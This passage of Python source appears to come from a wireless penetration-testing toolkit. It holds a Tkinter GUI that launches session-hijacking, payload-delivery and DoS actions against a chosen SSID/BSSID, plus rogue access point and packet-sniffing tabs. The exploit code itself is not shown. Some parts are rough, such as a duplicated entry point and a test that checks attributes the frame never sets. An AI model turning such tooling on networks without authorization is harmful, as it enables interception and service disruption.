        bssid = self.exploit_bssid_entry.get().strip()

        # Input validation
        if not selected_exploits:
            messagebox.showwarning("No Exploits Selected", "Please select at least one exploit.")
            return
        if not ssid or not bssid:
            messagebox.showwarning("Incomplete Target Information", "Please provide both SSID and BSSID.")
            return

        # Gather exploit-specific parameters
        target_session = {
            'target_ip': self.exploit_ip_entry.get().strip(),
            'target_mac': self.exploit_mac_entry.get().strip(),
            'gateway_ip': self.exploit_gateway_ip_entry.get().strip(),
            'gateway_mac': self.exploit_gateway_mac_entry.get().strip()
        }
        payload_type = self.payload_type_var.get()
        duration = 10  # Default duration; can be enhanced to allow user input

        # Define the target network details
        target = {
            'ssid': ssid,
            'bssid': bssid
        }

        # Reset stop_event before starting new exploits
        if self.stop_event.is_set():
            self.stop_event.clear()

        # Start exploitation in a separate thread
        threading.Thread(target=self.execute_exploits,
                         args=(selected_exploits, target, target_session, payload_type, duration),
                         daemon=True).start()

    def execute_exploits(self, exploits: list, target: Dict[str, str],
                         target_session: Dict[str, str], payload_type: str, duration: int):
        """
        Executes the selected exploits against the target network.

        Args:
            exploits (list): List of exploit names to run.
            target (Dict[str, str]): Target network details (SSID and BSSID).
            target_session (Dict[str, str]): Session hijacking parameters.
            payload_type (str): Type of payload for payload delivery exploits.
            duration (int): Duration for which the exploit should run.
        """
        for ex in exploits:
            if self.stop_event.is_set():
                self.log_exploit("Exploit operation interrupted by user.")
                break
            self.log_exploit(f"Running exploit: {ex}")
            vuln = self.vulnerability_db.get(ex, {})

            # Customize exploit parameters based on exploit type
            if ex == 'session_hijacking':
                vuln['target_session'] = target_session
            elif ex == 'payload_delivery':
                vuln['payload_type'] = payload_type
                vuln['duration'] = duration

            try:
                # Execute the exploit via CoreFramework
                self.core.run_exploit(ex, vuln, self.stop_event)
                self.log_exploit(f"Exploit '{ex}' completed.\n")
            except Exception as e:
                self.log_exploit(f"Error running exploit '{ex}': {e}\n")

    def log_exploit(self, message: str):
        """
        Logs messages to the exploit log area.

        Args:
            message (str): The message to log.
        """
        self.exploit_log.config(state='normal')
        self.exploit_log.insert(tk.END, message + '\n')
        self.exploit_log.see(tk.END)
        self.exploit_log.config(state='disabled')

    def create_report_tab(self, parent: ttk.Frame):
        """
        Creates the 'Reports' tab in the Notebook.

        Args:
            parent (ttk.Frame): The parent frame to attach the tab.
        """
        report_frame = ttk.Frame(self.notebook)
        self.notebook.add(report_frame, text='Reports')

        # Report Display Area
        self.report_text = tk.Text(report_frame, height=25, state='disabled')
        self.report_text.pack(padx=10, pady=10, fill='both', expand=True)

        # Export Report Button
        export_button = ttk.Button(report_frame, text="Export Report", command=self.export_report)
        export_button.pack(pady=5)

    def export_report(self):
        """
        Exports the generated reports to a file.

        Allows the user to choose the format (TXT or JSON) and the destination file.
        """
        # Prompt user to choose export format and location
        export_format = tk.StringVar(value='txt')
        format_window = tk.Toplevel(self)
        format_window.title("Select Export Format")
        ttk.Label(format_window, text="Choose Report Format:").pack(padx=10, pady=10)
        format_combo = ttk.Combobox(format_window, textvariable=export_format, state='readonly')
        format_combo['values'] = ['txt', 'json']
        format_combo.pack(padx=10, pady=5)
        format_combo.current(0)

        def confirm_export():
            selected_format = export_format.get()
            if selected_format == 'txt':
                file_path = filedialog.asksaveasfilename(defaultextension=".txt",
                                                         filetypes=[("Text Files", "*.txt"), ("All files", "*.*")])
                if file_path:
                    try:
                        with open(file_path, 'w') as f:
                            f.write(self.report_text.get(1.0, tk.END))
                        messagebox.showinfo("Export Successful", f"Report exported to {file_path}")
                    except Exception as e:
                        messagebox.showerror("Export Error", f"Failed to export report: {e}")
            elif selected_format == 'json':
                file_path = filedialog.asksaveasfilename(defaultextension=".json",
                                                         filetypes=[("JSON Files", "*.json"), ("All files", "*.*")])
                if file_path:
                    # Collect report data from scanners and exploits
                    report_data = {
                        'scans': [],
                        'exploits': []
                    }
                    for sc_name, scanner in self.core.scanners.items():
                        if hasattr(scanner, 'detected_vulnerabilities') and scanner.detected_vulnerabilities:
                            report_data['scans'].append({
                                'scanner': sc_name,
                                'vulnerabilities': scanner.detected_vulnerabilities
                            })
                    for ex_name, exploit in self.core.exploits.items():
                        if hasattr(exploit, 'detected_vulnerabilities') and exploit.detected_vulnerabilities:
                            report_data['exploits'].append({
                                'exploit': ex_name,
                                'vulnerabilities': exploit.detected_vulnerabilities
                            })
                    try:
                        with open(file_path, 'w') as f:
                            json.dump(report_data, f, indent=4)
                        messagebox.showinfo("Export Successful", f"Report exported to {file_path}")
                    except Exception as e:
                        messagebox.showerror("Export Error", f"Failed to export report: {e}")
            format_window.destroy()

        ttk.Button(format_window, text="Export", command=confirm_export).pack(pady=10)

    def create_settings_tab(self, parent: ttk.Frame):
        """
        Creates the 'Settings' tab in the Notebook.

        Args:
            parent (ttk.Frame): The parent frame to attach the tab.
        """
        settings_frame = ttk.Frame(self.notebook)
        self.notebook.add(settings_frame, text='Settings')

        # Configuration Settings Label
        config_label = ttk.Label(settings_frame, text="Configuration Settings:")
        config_label.pack(pady=5)

        # Configuration Display Area
        self.config_text = tk.Text(settings_frame, height=20, state='disabled')
        self.config_text.pack(padx=10, pady=10, fill='both', expand=True)

        # Refresh Configuration Button
        refresh_button = ttk.Button(settings_frame, text="Refresh Configuration", command=self.load_configuration)
        refresh_button.pack(pady=5)

        # Load and Display Current Configuration
        self.load_configuration()

    def load_configuration(self):
        """
        Loads and displays the current configuration settings from the vulnerabilities database.
        """
        current_dir = os.path.dirname(os.path.abspath(__file__))
        project_root = os.path.abspath(os.path.join(current_dir, '..'))
        config_path = os.path.join(project_root, 'vulnerabilities', 'vulnerabilities.json')

        if os.path.exists(config_path):
            try:
                with open(config_path, 'r') as f:
                    config = json.load(f)
                self.config_text.config(state='normal')
                self.config_text.delete(1.0, tk.END)
                for key, value in config.items():
                    self.config_text.insert(tk.END, f"{key}: {value}\n")
                self.config_text.config(state='disabled')
            except Exception as e:
                messagebox.showerror("Configuration Error", f"Failed to load configuration: {e}")
                self.config_text.config(state='normal')
                self.config_text.delete(1.0, tk.END)
                self.config_text.insert(tk.END, "Error loading configuration.")
                self.config_text.config(state='disabled')
        else:
            self.config_text.config(state='normal')
            self.config_text.delete(1.0, tk.END)
            self.config_text.insert(tk.END, "No configuration found.")
            self.config_text.config(state='disabled')

    def create_live_packet_monitor_tab(self, parent: ttk.Frame):
        """
        Creates the 'Live Packet Monitor' tab in the Notebook.

        Args:
            parent (ttk.Frame): The parent frame to attach the tab.
        """
        live_packet_monitor = LivePacketMonitor(parent)
        self.notebook.add(live_packet_monitor, text="Live Packet Monitor")

    def create_fake_devices_tab(self, parent: ttk.Frame):
        """
        Creates the 'Fake Devices' tab in the Notebook.

        Args:
            parent (ttk.Frame): The parent frame to attach the tab.
        """
        fake_devices_frame = FakeDeviceManager(parent)
        self.notebook.add(fake_devices_frame, text="Fake Devices")

    def create_rogue_access_point_tab(self, parent: ttk.Frame):
        """
        Creates the 'Rogue Access Point' tab in the Notebook.

        Args:
            parent (ttk.Frame): The parent frame to attach the tab.
        """
        rogue_access_point_frame = FakeAccessPoint(parent)
        self.notebook.add(rogue_access_point_frame, text="Rogue Access Point")

"""
    def create_network_visualization_tab(self, parent):
        
        network_visualization_frame = NetworkGraphVisualizationFrame(parent)
        self.notebook.add(network_visualization_frame, text="Network Visualization")
"""

def main():
    """
    Entry point for the WirelessPenTestLib GUI application.

    Ensures the script is run with root privileges and initializes the GUI.
    """
    # Check for root privileges

    # Initialize and run the GUI application
    app = WirelessPenTestGUI()
    app.mainloop()


if __name__ == "__main__":
    main()





if __name__ == '__main__':
    app = WirelessPenTestGUI()
    app.mainloop()

# ui/test_gui.py
import unittest
from .gui import WirelessPenTestGUI
from ui.frames.live_network_frame import LiveNetworkFrame


def create_fake_test_data():
    return {
        "wpa_networks": {
            "00:11:22:33:44:55": {
                "SSID": "TestNetwork",
                "BSSID": "00:11:22:33:44:55",
                "Security": "WPA2",
                "WPS_Enabled": False
            }
        },
        "wep_networks": {
            "00:11:22:33:44:66": {
                "SSID": "TestNetwork",
                "BSSID": "00:11:22:33:44:66",
                "Security": "WEP",
                "Key_Strength": "Weak"
            }
        }
    }

class TestGui(unittest.TestCase):
    def test_gui(self):
        # Create a fake test data
        test_data = create_fake_test_data()

        # Create a GUI instance
        gui = WirelessPenTestGUI()

        # Create a LiveNetworkFrame instance
        live_network_frame = LiveNetworkFrame(gui, core_framework=None)

        # Update the GUI with the test data
        live_network_frame.update_gui(test_data)

        # Check if the GUI has been updated correctly
        self.assertEqual(gui.wpa_networks, test_data["wpa_networks"])
        self.assertEqual(gui.wep_networks, test_data["wep_networks"])

if __name__ == '__main__':
    unittest.main()

# ui/__init__.py
from .gui import WirelessPenTestGUI
from ui.frames.live_network_frame import LiveNetworkFrame


# ui/frames/base_frame.py
from abc import ABC, abstractmethod
from tkinter import Tk, Frame, Label, Button, Entry, StringVar, messagebox
from tkinter import ttk
from typing import Dict, Any
from core import CoreFramework


class BaseFrame(ttk.Frame, ABC):
    def __init__(self, parent: Tk, core_framework: CoreFramework, *args, **kwargs):
        """
        Initializes the BaseFrame.
        Args:
            parent (Tk): The parent Tkinter widget.
            core_framework (CoreFramework): An instance of CoreFramework.
        """
        super().__init__(parent, *args, **kwargs)
        self.parent = parent
        self.core_framework = core_framework

    @abstractmethod
    def create_widgets(self):
        """
        Creates and arranges all GUI components.
        """
        pass

    @abstractmethod
    def update_gui(self, data: Dict[str, Any]):
        """
        Updates the GUI with the given data.
        Args:
            data (Dict[str, Any]): The data to update the GUI with.
        """
        pass

    @abstractmethod
    def clear_gui(self):
        """
        Clears the GUI components.
        """
        pass

# ui/frames/live_network_frame.py
import threading
import queue
from typing import List, Dict, Any
import tkinter as tk
from tkinter import ttk, messagebox
from scanners.local_scanner import LocalScanner  # Ensure this import is correct
from scanners.dos_scanner import DosScanner  # Ensure this import is correct


def create_fake_test_data():
    return {
        "devices": [
            {
                "ip": "123.22.22.22",
                "mac": "00:11:22:33:44:55",
                "hostname": "TestDevice",
                "ssid": "TestNetwork",
                "bssid": "00:11:22:33:44:55"
            }
        ]
    }


class LiveNetworkFrame(ttk.Frame):
    def __init__(self, parent: tk.Tk, core_framework, scan_interval: int = 5, *args, **kwargs):
        """
        Initializes the LiveNetworkFrame.
        Args:
            parent (tk.Tk): The parent Tkinter widget.
            core_framework (CoreFramework): An instance of CoreFramework.
            scan_interval (int): Interval between scans in seconds.
        """
        super().__init__(parent, *args, **kwargs)
        self.parent = parent
        self.pack(fill='both', expand=True)
        self.core_framework = core_framework


        # Initialize Scanners with CoreFramework
        self.scanner = LocalScanner(core_framework=self.core_framework,
                                    interface="eth0")  # Make the interface configurable
        self.dos_scanner = DosScanner(core_framework=self.core_framework, vulnerability_db={})

        self.scan_interval = scan_interval  # Scan interval in seconds

        # Initialize Queue for Scan Results
        self.device_queue = queue.Queue()

        # Setup Logger
        self.logger = self.scanner.logger  # Assuming LocalScanner has a logger

        # Setup GUI Components
        self.create_widgets()

        # Start processing the scan queue
        self.process_scan_queue()

    def create_widgets(self):
        """
        Creates and arranges all GUI components.
        """
        # Frame for Scan Controls
        control_frame = ttk.LabelFrame(self, text="Network Scan Controls")
        control_frame.pack(padx=10, pady=10, fill='x')

        # Manual Scan Button
        scan_button = ttk.Button(control_frame, text="Perform Manual Scan", command=self.perform_manual_scan)
        scan_button.pack(side='left', padx=5, pady=5)

        # DoS Scan Button
        dos_button = ttk.Button(control_frame, text="Start DoS Scan", command=self.initiate_dos_scan)
        dos_button.pack(side='left', padx=5, pady=5)

        # Treeview for Displaying Devices
        columns = ("IP Address", "MAC Address", "Hostname", "SSID", "BSSID")
        self.tree = ttk.Treeview(self, columns=columns, show='headings')
        for col in columns:
            self.tree.heading(col, text=col)
            self.tree.column(col, width=150)
        self.tree.pack(padx=10, pady=10, fill='both', expand=True)

        # Scrollbar for Treeview
        scrollbar = ttk.Scrollbar(self, orient='vertical', command=self.tree.yview)
        self.tree.configure(yscroll=scrollbar.set)
        scrollbar.pack(side='right', fill='y')

        # Feedback Label
        self.feedback_label = ttk.Label(self, text="Welcome to Network Scanner GUI", foreground="blue")
        self.feedback_label.pack(pady=5)

    def perform_manual_scan(self):
        """
        Initiates a manual network scan and updates the Treeview with the scan results.
        """
        self.logger.info("Manual network scan initiated.")
        self.update_feedback("Manual network scan started.")

        def scan():
            try:
                scan_results = self.scanner.scan()  # Implement the actual scan method
                self.device_queue.put(scan_results)
                self.logger.info("Manual network scan completed.")
                self.update_feedback("Manual network scan completed.")
            except Exception as e:
                self.logger.error(f"Error during manual network scan: {e}")
                self.update_feedback(f"Error during manual network scan: {e}")

        threading.Thread(target=scan, daemon=True).start()

    def process_scan_queue(self):
        """
        Processes scan results from the device_queue and updates the Treeview.
        Schedules itself to run every second.
        """
        try:
            while not self.device_queue.empty():
                scan_results = self.device_queue.get_nowait()
                devices = scan_results.get("devices", [])
                self.update_treeview(devices)
        except queue.Empty:
            pass
        except Exception as e:
            self.logger.error(f"Error processing scan queue: {e}")
            self.update_feedback(f"Error processing scan queue: {e}")
        finally:
            self.after(1000, self.process_scan_queue)  # Check the queue every second

    def update_treeview(self, devices: List[Dict[str, Any]]):
        """
        Updates the Treeview with new scan results.
        Args:
            devices (List[Dict[str, Any]]): List of detected devices.
        """
        # Clear existing entries
        for item in self.tree.get_children():
            self.tree.delete(item)

        # Insert new entries
        for device in devices:
            ip = device.get("ip", "N/A")
            mac = device.get("mac", "N/A")
            hostname = device.get("hostname", "N/A")
            ssid = device.get("ssid", "N/A")
            bssid = device.get("bssid", "N/A")
            self.tree.insert("", "end", values=(ip, mac, hostname, ssid, bssid))

    def initiate_dos_scan(self):
        """
        Initiates a DoS scan on the selected target(s) in the Treeview.
        """
        selected_items = self.tree.selection()
        if not selected_items:
            self.update_feedback("No target selected for DoS scan.")
            return

        for item_id in selected_items:
            target = self.tree.item(item_id)['values']
            if not target:
                self.update_feedback("Invalid target selected.")
                continue

            # Assuming Treeview columns are ordered as: IP, MAC, Hostname, SSID, BSSID
            bssid = target[4]  # BSSID is at index 4
            target_info = {'bssid': bssid}
            self.update_feedback(f"Initiating DoS scan on target with BSSID: {bssid}")

            def dos_scan():
                try:
                    self.dos_scanner.scan(target_info)  # Implement the actual DoS scan method
                    self.update_feedback(f"DoS scan on BSSID {bssid} completed.")
                except Exception as e:
                    self.logger.error(f"Error during DoS scan on BSSID {bssid}: {e}")
                    self.update_feedback(f"Error during DoS scan on BSSID {bssid}: {e}")

            threading.Thread(target=dos_scan, daemon=True).start()

    def update_feedback(self, message: str):
        """
        Updates the feedback label with the provided message.
        Args:
            message (str): The message to display to the user.
        """
        self.feedback_label.config(text=message)

    def update_feedback_with_test_data(self):
        """
        Updates the feedback label with test data.
        """
        self.feedback_label.config(text="Test data updated successfully.")
        self.update_feedback("Test data updated successfully.")
        self.update_feedback(f"devices: {create_fake_test_data()}")

# ui/frames/live_packet_monitor.py
import tkinter as tk
from tkinter import ttk, messagebox, filedialog
from tkinter import StringVar, Text, Scrollbar, END, VERTICAL, HORIZONTAL, N, S, E, W

from scapy.all import sniff, wrpcap, rdpcap, Packet
from scapy.layers.l2 import Ether
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11ProbeResp
import threading
import time
import queue
import os


# Assuming BaseFrame is a subclass of ttk.Frame
class BaseFrame(ttk.Frame):
    def __init__(self, parent, *args, **kwargs):
        super().__init__(parent, *args, **kwargs)


class LivePacketMonitor(BaseFrame):
    """
    Wireshark-like live packet monitoring frame
    """
    def __init__(self, parent):
        """
        Initializes the LivePacketMonitor.
        """
        super().__init__(parent)
        self.parent = parent
        self.pack(fill=tk.BOTH, expand=True)

        # Initialize variables
        self.packet_list = []
        self.sniffing = False
        self.sniffer_thread = None
        self.packet_queue = queue.Queue()

        # Create GUI components
        self.create_widgets()

        # Start a periodic GUI update
        self.parent.after(100, self.process_packet_queue)

    def create_widgets(self):
        """
        Creates and arranges all GUI components.
        """
        # Top Frame for buttons
        button_frame = ttk.Frame(self)
        button_frame.pack(fill=tk.X, padx=5, pady=5)

        # Start Button
        self.start_button = ttk.Button(button_frame, text="Start", command=self.start_sniffing)
        self.start_button.pack(side=tk.LEFT, padx=5)

        # Stop Button
        self.stop_button = ttk.Button(button_frame, text="Stop", command=self.stop_sniffing, state=tk.DISABLED)
        self.stop_button.pack(side=tk.LEFT, padx=5)

        # Save Button
        self.save_button = ttk.Button(button_frame, text="Save", command=self.save_packets)
        self.save_button.pack(side=tk.LEFT, padx=5)

        # Load Button
        self.load_button = ttk.Button(button_frame, text="Load", command=self.load_packets)
        self.load_button.pack(side=tk.LEFT, padx=5)

        # Clear Button
        self.clear_button = ttk.Button(button_frame, text="Clear", command=self.clear_packets)
        self.clear_button.pack(side=tk.LEFT, padx=5)

        # Filter Entry and Button
        self.filter_var = StringVar()
        self.filter_entry = ttk.Entry(button_frame, textvariable=self.filter_var)
        self.filter_entry.pack(side=tk.LEFT, padx=5)
        self.filter_entry.insert(0, "Filter (e.g., tcp, udp)")

        self.filter_button = ttk.Button(button_frame, text="Apply Filter", command=self.filter_packets)
        self.filter_button.pack(side=tk.LEFT, padx=5)

        # Treeview for packet list
        columns = ("No.", "Time", "Source", "Destination", "Protocol")
        self.tree = ttk.Treeview(self, columns=columns, show="headings")
        for col in columns:
            self.tree.heading(col, text=col)
            self.tree.column(col, anchor=tk.W, stretch=True)

        # Vertical Scrollbar
        vsb = ttk.Scrollbar(self, orient=VERTICAL, command=self.tree.yview)
        self.tree.configure(yscroll=vsb.set)
        vsb.pack(side=tk.RIGHT, fill=tk.Y)

        # Horizontal Scrollbar
        hsb = ttk.Scrollbar(self, orient=HORIZONTAL, command=self.tree.xview)
        self.tree.configure(xscroll=hsb.set)
        hsb.pack(side=tk.BOTTOM, fill=tk.X)

        self.tree.pack(fill=tk.BOTH, expand=True)

        # Bind selection
        self.tree.bind("<<TreeviewSelect>>", self.view_packet)

        # Text widget for packet details
        detail_frame = ttk.Frame(self)
        detail_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        detail_label = ttk.Label(detail_frame, text="Packet Details:")
        detail_label.pack(anchor=tk.W)

        self.detail_text = Text(detail_frame, height=15, wrap=tk.NONE)
        self.detail_text.pack(fill=tk.BOTH, expand=True, side=tk.LEFT)

        # Scrollbars for detail_text
        detail_vsb = Scrollbar(detail_frame, orient=VERTICAL, command=self.detail_text.yview)
        self.detail_text.configure(yscrollcommand=detail_vsb.set)
        detail_vsb.pack(side=tk.RIGHT, fill=tk.Y)

    def update_gui(self, packet_info):
        """
        Updates the GUI with the given data.
        Args:
            packet_info (Dict[str, Any]): The data to update the GUI with.
        """
        self.packet_list.append(packet_info)
        index = len(self.packet_list)
        self.tree.insert("", "end", iid=index, values=(
            index,
            packet_info['time'],
            packet_info['source'],
            packet_info['destination'],
            packet_info['protocol']
        ))

    def clear_gui(self):
        """
        Clears the GUI components.
        """
        for item in self.tree.get_children():
            self.tree.delete(item)
        self.detail_text.delete(1.0, END)
        self.packet_list.clear()

    def start_sniffing(self):
        """
        Starts sniffing packets.
        """
        if not self.sniffing:
            self.sniffing = True
            self.sniffer_thread = threading.Thread(target=self.sniff_packets, daemon=True)
            self.sniffer_thread.start()
            self.start_button.config(state=tk.DISABLED)
            self.stop_button.config(state=tk.NORMAL)
            messagebox.showinfo("Sniffing Started", "Packet sniffing has started.")
        else:
            messagebox.showwarning("Warning", "Sniffing is already running.")

    def stop_sniffing(self):
        """
        Stops sniffing packets.
        """
        if self.sniffing:
            self.sniffing = False
            self.sniffer_thread.join()
            self.start_button.config(state=tk.NORMAL)
            self.stop_button.config(state=tk.DISABLED)
            messagebox.showinfo("Sniffing Stopped", "Packet sniffing has stopped.")
        else:
            messagebox.showwarning("Warning", "Sniffing is not running.")

    def sniff_packets(self):
        """
        Sniffs packets using Scapy and puts them into a queue for the GUI to process.
        """
        try:
            sniff(prn=self.packet_handler, store=False, stop_filter=lambda x: not self.sniffing)
        except Exception as e:
            messagebox.showerror("Error", f"An error occurred while sniffing packets:\n{e}")
            self.sniffing = False
            self.start_button.config(state=tk.NORMAL)
            self.stop_button.config(state=tk.DISABLED)

    def packet_handler(self, pkt):
        """
        Handles packets captured by the sniffer.
        Args:
            pkt: The packet captured by the sniffer.
        """
        # Extract relevant information
        pkt_time = time.strftime("%H:%M:%S", time.localtime(pkt.time))
        src = "N/A"
        dst = "N/A"
        protocol = pkt.summary()

        if Ether in pkt:
            src = pkt[Ether].src
            dst = pkt[Ether].dst

        # You can extend this to extract more details as needed

        packet_info = {
            'time': pkt_time,
            'source': src,
            'destination': dst,
            'protocol': protocol,
            'packet': pkt  # Store the entire packet for detailed view
        }

        # Put the packet_info into the queue
        self.packet_queue.put(packet_info)

    def process_packet_queue(self):
        """
        Processes the packet queue and updates the GUI accordingly.
        """
        try:
            while True:
                packet_info = self.packet_queue.get_nowait()
                self.update_gui(packet_info)
        except queue.Empty:
            pass
        finally:
            # Schedule the next check
            self.parent.after(100, self.process_packet_queue)

    def save_packets(self):
        """
        Saves the captured packets to a file.
        """
        if not self.packet_list:
            messagebox.showwarning("No Packets", "There are no packets to save.")
            return

        file_path = filedialog.asksaveasfilename(
            defaultextension=".pcap",
            filetypes=[("PCAP files", "*.pcap"), ("All files", "*.*")]
        )

        if file_path:
            try:
                packets = [pkt_info['packet'] for pkt_info in self.packet_list]
                wrpcap(file_path, packets)
                messagebox.showinfo("Success", f"Packets saved to {file_path}")
            except Exception as e:
                messagebox.showerror("Error", f"Failed to save packets:\n{e}")

    def load_packets(self):
        """
        Loads packets from a file.
        """
        file_path = filedialog.askopenfilename(
            filetypes=[("PCAP files", "*.pcap"), ("All files", "*.*")]
        )

        if file_path:
            try:
                loaded_packets = rdpcap(file_path)
                self.clear_packets()
                for pkt in loaded_packets:
                    pkt_time = time.strftime("%H:%M:%S", time.localtime(pkt.time))
                    src = "N/A"
                    dst = "N/A"
                    protocol = pkt.summary()

                    if Ether in pkt:
                        src = pkt[Ether].src
                        dst = pkt[Ether].dst

                    packet_info = {
                        'time': pkt_time,
                        'source': src,
                        'destination': dst,
                        'protocol': protocol,
                        'packet': pkt
                    }

                    self.update_gui(packet_info)
                messagebox.showinfo("Success", f"Loaded {len(loaded_packets)} packets from {file_path}")
            except Exception as e:
                messagebox.showerror("Error", f"Failed to load packets:\n{e}")

    def clear_packets(self):
        """
        Clears the captured packets.
        """
        if messagebox.askyesno("Confirm", "Are you sure you want to clear all captured packets?"):
            self.clear_gui()

    def filter_packets(self):
        """
        Filters the captured packets based on user input.
        """
        filter_text = self.filter_var.get().strip().lower()
        if not filter_text:
            # If no filter, show all packets
            for item in self.tree.get_children():
                self.tree.delete(item)
            for index, pkt_info in enumerate(self.packet_list, start=1):
                self.tree.insert("", "end", iid=index, values=(
                    index,
                    pkt_info['time'],
                    pkt_info['source'],
                    pkt_info['destination'],
                    pkt_info['protocol']
                ))
            return

        # Filter packets
        filtered_packets = []
        for pkt_info in self.packet_list:
            if filter_text in pkt_info['protocol'].lower():
                filtered_packets.append(pkt_info)

        # Update Treeview
        self.tree.delete(*self.tree.get_children())
        for index, pkt_info in enumerate(filtered_packets, start=1):
            self.tree.insert("", "end", iid=index, values=(
                index,
                pkt_info['time'],
                pkt_info['source'],
                pkt_info['destination'],
                pkt_info['protocol']
            ))

    def view_packet(self, event):
        """
        Views the details of a selected packet.
        """
        selected_items = self.tree.selection()
        if not selected_items:
            return

        selected_item = selected_items[0]
        index = int(selected_item) - 1
        if index < 0 or index >= len(self.packet_list):
            messagebox.showerror("Error", "Invalid packet selection.")
            return

        pkt = self.packet_list[index]['packet']

        # Create a new window to display packet details
        detail_window = tk.Toplevel(self)
        detail_window.title(f"Packet #{index + 1} Details")
        detail_window.geometry("800x600")

        # Text widget with scrollbar
        text_area = Text(detail_window, wrap=tk.NONE)
        text_area.pack(fill=tk.BOTH, expand=True, side=tk.LEFT)

        text_vsb = Scrollbar(detail_window, orient=VERTICAL, command=text_area.yview)
        text_vsb.pack(side=tk.RIGHT, fill=tk.Y)
        text_area.configure(yscrollcommand=text_vsb.set)

        text_hsb = Scrollbar(detail_window, orient=HORIZONTAL, command=text_area.xview)
        text_hsb.pack(side=tk.BOTTOM, fill=tk.X)
        text_area.configure(xscrollcommand=text_hsb.set)

        # Insert packet details
        packet_details = pkt.show(dump=True)
        text_area.insert(END, packet_details)
        text_area.config(state=tk.DISABLED)

    def export_packet(self):
        """
        Exports the details of a selected packet.
        """
        selected_items = self.tree.selection()
        if not selected_items:
            messagebox.showwarning("No Selection", "Please select a packet to export.")
            return

        selected_item = selected_items[0]
        index = int(selected_item) - 1
        if index < 0 or index >= len(self.packet_list):
            messagebox.showerror("Error", "Invalid packet selection.")
            return

        pkt = self.packet_list[index]['packet']

        file_path = filedialog.asksaveasfilename(
            defaultextension=".txt",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
        )

        if file_path:
            try:
                with open(file_path, 'w') as f:
                    f.write(pkt.show(dump=True))
                messagebox.showinfo("Success", f"Packet details exported to {file_path}")
            except Exception as e:
                messagebox.showerror("Error", f"Failed to export packet:\n{e}")

    def import_packet(self):
        """
        Imports a packet from a file.
        """
        file_path = filedialog.askopenfilename(
            filetypes=[("PCAP files", "*.pcap"), ("All files", "*.*")]
        )

        if file_path:
            try:
                imported_packets = rdpcap(file_path)
                for pkt in imported_packets:
                    pkt_time = time.strftime("%H:%M:%S", time.localtime(pkt.time))
                    src = "N/A"
                    dst = "N/A"
                    protocol = pkt.summary()

                    if Ether in pkt:
                        src = pkt[Ether].src
                        dst = pkt[Ether].dst

                    packet_info = {
                        'time': pkt_time,
                        'source': src,
                        'destination': dst,
                        'protocol': protocol,
                        'packet': pkt
                    }

                    self.update_gui(packet_info)
                messagebox.showinfo("Success", f"Imported {len(imported_packets)} packets from {file_path}")
            except Exception as e:
                messagebox.showerror("Error", f"Failed to import packets:\n{e}")


# Example usage within a Tkinter application
def main():
    root = tk.Tk()
    root.title("Live Packet Monitor")
    root.geometry("1000x700")

    app = LivePacketMonitor(root)

    root.mainloop()


if __name__ == "__main__":
    main()


# ui/frames/network_graph_visualization.py
from tkinter import Tk
from matplotlib.backends.backend_tkagg import FigureCanvasTkAgg
import matplotlib.pyplot as plt
from typing import Dict, Any
from core import CoreFramework
import logging

from ui.frames.base_frame import BaseFrame


class NetworkGraphVisualizationFrame(BaseFrame):
    def __init__(self, parent: Tk, core_framework: CoreFramework, *args, **kwargs):
        """
        Initializes the NetworkGraphVisualizationFrame.
        Args:
            parent (Tk): The parent Tkinter widget.
            core_framework (CoreFramework): An instance of CoreFramework.
        """
        super().__init__(parent, *args, **kwargs)
        self.parent = parent
        self.core_framework = core_framework
        self.pack(fill='both', expand=True)

        # Setup Logger
        self.logger = logging.getLogger(__name__)

        # Setup GUI Components
        self.create_widgets()

    def create_widgets(self):
        """
        Creates and arranges all GUI components.
        """
        self.figure = plt.Figure(figsize=(5, 5), dpi=100)
        self.subplot = self.figure.add_subplot(111)
        self.graph = FigureCanvasTkAgg(self.figure, self)
        self.graph.get_tk_widget().pack(side='top', fill='both', expand=True)

    def update_gui(self, data: Dict[str, Any]):
        """
        Updates the GUI with the given data.
        Args:
            data (Dict[str, Any]): The data to update the GUI with.
        """
        self.logger.info("Updating the GUI with the given data...")
        self.logger.debug(f"Data: {data}")

        # Clear the previous graph
        self.subplot.clear()

        # Update the graph with the new data
        x = data.get("x", [])
        y = data.get("y", [])
        self.subplot.plot(x, y)

        # Draw the updated graph
        self.graph.draw()

    def clear_gui(self):
        """
        Clears the GUI components.
        """
        self.logger.info("Clearing the GUI components...")
        self.subplot.clear()
        self.graph.draw()



# ui/frames/network_map.py
# ui/frames/network_map_frame.py

"""
NetworkMapFrame Module

This module defines the NetworkMapFrame class, a subclass of BaseFrame, which provides
graphical representations of discovered networks, devices, and their interconnections.
It utilizes NetworkX for graph management and Matplotlib for visualization, embedded within
a Tkinter GUI.

** Important Note:**
Creating rogue access points and performing network penetration testing should only be done
with explicit permission on networks you own or have authorization to test. Unauthorized
access to networks is illegal and unethical.
"""

import tkinter as tk
from tkinter import ttk
from tkinter import messagebox
from typing import Optional, Dict, Any

import networkx as nx
import matplotlib.pyplot as plt
from matplotlib.backends.backend_tkagg import FigureCanvasTkAgg
from matplotlib.figure import Figure

from ui.frames.base_frame import BaseFrame  # Assuming BaseFrame is in ui/base_frame.py


class NetworkMapFrame(BaseFrame):
    """
    Frame for visualizing network topology, including networks, devices, and their interconnections.

    Attributes:
        graph (nx.Graph): NetworkX graph representing the network topology.
        figure (Figure): Matplotlib figure for plotting the graph.
        canvas (FigureCanvasTkAgg): Canvas widget to embed the Matplotlib figure into Tkinter.
    """

    def __init__(self, parent, **kwargs):
        """
        Initializes the NetworkMapFrame.

        Args:
            parent (ttk.Notebook): The parent Notebook widget to attach the frame.
            core_framework (Any): Instance of CoreFramework for accessing network data.
            **kwargs: Additional keyword arguments for the BaseFrame.
        """
        super().__init__(parent, **kwargs)
        self.parent = parent


        # Initialize the NetworkX graph
        self.graph: nx.Graph = nx.Graph()

        # Set up the GUI components
        self.create_widgets()

        # Initial load of network data
        self.load_network_data()

    def create_widgets(self):
        """
        Creates and arranges all GUI components within the NetworkMapFrame.
        """
        # Frame for controls (e.g., Refresh Button)
        controls_frame = ttk.Frame(self)
        controls_frame.pack(fill=tk.X, padx=10, pady=5)

        # Refresh Button
        refresh_button = ttk.Button(controls_frame, text="Refresh Network Map", command=self.refresh_network_map)
        refresh_button.pack(side=tk.LEFT, padx=5)

        # Instructions Label
        instructions = ttk.Label(controls_frame, text="Click on a node to view details.")
        instructions.pack(side=tk.LEFT, padx=10)

        # Frame for the network graph
        graph_frame = ttk.Frame(self)
